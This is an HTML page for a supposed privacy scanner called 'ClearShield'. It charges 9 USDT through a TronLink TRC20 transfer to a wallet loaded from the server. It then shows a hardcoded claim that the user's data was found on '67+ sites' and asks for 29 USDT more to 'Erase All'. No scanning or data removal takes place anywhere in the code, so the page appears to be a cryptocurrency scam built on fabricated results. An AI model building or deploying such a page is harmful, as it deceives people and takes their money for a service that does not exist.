<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>ClearShield – Privacy Scanner</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body{margin:0;font-family:Arial;background:#0d0d0d;color:#fff;display:flex;flex-direction:column;align-items:center;padding:40px 20px}
    .c{max-width:420px;width:100%;text-align:center}
    h1{font-size:28px}
    .card{background:#161616;padding:25px;margin-top:25px;border-radius:12px}
    button{background:#f4c24d;color:#000;border:none;padding:15px;font-size:18px;border-radius:8px;width:100%;margin-top:15px;font-weight:bold;cursor:pointer}
    #success{display:none}
  </style>
</head>
<body>
  <div class="c">
    <h1>ClearShield</h1>
    <p>Remove your data from 100+ sites forever</p>
    <div class="card">
      <button onclick="pay(9)">Start Scan – 9 USDT</button>
    </div>
    <div id="success" class="card">
      <p>Payment confirmed! Found in 67+ sites.</p>
      <button onclick="pay(29)" style="background:#d32f2f">Erase All – 29 USDT</button>
    </div>
  </div>

  <script>
    let wallet = "";
    fetch('/config').then(r=>r.json()).then(d=>wallet=d.wallet);

    async function pay(amount) {
      if (!window.tronWeb) {
        alert("TronLink not detected! Please install or unlock TronLink.");
        return;
      }

      try {
        const tronWeb = window.tronWeb;
        const contract = await tronWeb.contract().at("TR7NHqjeKQxGTCuuQdCA3f2Y2Y8pSQVr7i"); // USDT TRC20
        await contract.transfer(wallet, amount * 1000000).send({
          feeLimit: 10000000
        });
        document.getElementById('success').style.display = 'block';
        alert("Payment successful! Thank you!");
      } catch (err) {
        if (err.message && err.message.includes("User rejection")) {
          alert("You cancelled the payment.");
        } else {
          alert("Error: " + (err.message || err));
        }
      }
    }
  </script>
</body>
</html>
